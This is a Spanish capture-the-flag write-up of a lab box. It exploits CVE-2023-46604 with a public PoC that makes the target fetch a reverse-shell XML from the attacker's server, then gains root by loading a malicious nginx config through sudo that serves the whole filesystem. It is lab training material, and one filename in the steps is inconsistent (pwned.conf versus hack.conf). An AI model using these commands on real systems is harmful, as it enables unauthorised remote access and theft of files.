Hacemos el reconocimiento de nmap:
![[Pasted image 20231124103124.png]]
![[Pasted image 20231124103141.png]]
Accedemos al puerto 80 y nos encontramos con esto:
![[Pasted image 20231124103309.png]]
Pero si ponemos admin:admin accedemos:
![[Pasted image 20231124103333.png]]
Pero si hacemos clic en este enlace, nos redirige a un panel de admin:
![[Pasted image 20231124103515.png]]
Donde vemos información sensible, como la versión 5.15 de este servicio:
![[Pasted image 20231124103527.png]]
Y si buscamos por internet, encontramos el CVE-2023-46604:
![[Pasted image 20231124104022.png]]
Buscamos una PoC en github y nos encontramos la siguiente:
https://github.com/evkl1d/CVE-2023-46604
![[Pasted image 20231124104134.png]]
Donde nos indican que vamos a necesitar subir con este exploit el fichero poc.xml:
![[Pasted image 20231124104445.png]]
Vemos las instrucciones de uso:
![[Pasted image 20231124104311.png]]
Editamos el contenido del fichero poc.xml añadiendo la reverse shell:
![[Pasted image 20231124104618.png]]
Nos ponemos a la escucha con netcat:
![[Pasted image 20231124104810.png]]
Levantamos un servidor HTTP con Python con el archivo PoC.xml:
![[Pasted image 20231124105541.png]]
Ejecutamos el exploit:
```
python3 exploit.py -i 10.10.11.243 -u http://10.10.16.7/poc.xml
```
![[Pasted image 20231124105607.png]]
Y habremos recibido la reverse shell:
![[Pasted image 20231124105621.png]]
Vemos que podemos ejecutar con root nginx:
![[Pasted image 20231124110550.png]]
Para ello, nos copiamos el fichero de configuración de nginx y lo modificamos:
```
cp /etc/nginx/nginx.conf /tmp  
mv nginx.conf pwned.conf
```
Y lo editamos añadiendo el siguiente contenido:
```
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```
![[Pasted image 20231124111735.png]]
Ahora levantamos el servidor nginx cargando el nuevo fichero de configuración malicioso:
```
sudo /usr/sbin/nginx -c /tmp/hack.conf
```
![[Pasted image 20231124111822.png]]
Y ahora desde curl y especificando el puerto 1337, que fue el que indicamos antes, ya podremos acceder a cualquier directorio o archivo del sistema ya que estaríamos moviéndonos como root:
```
curl localhost:1337/root/root.txt
```
![[Pasted image 20231124111956.png]]
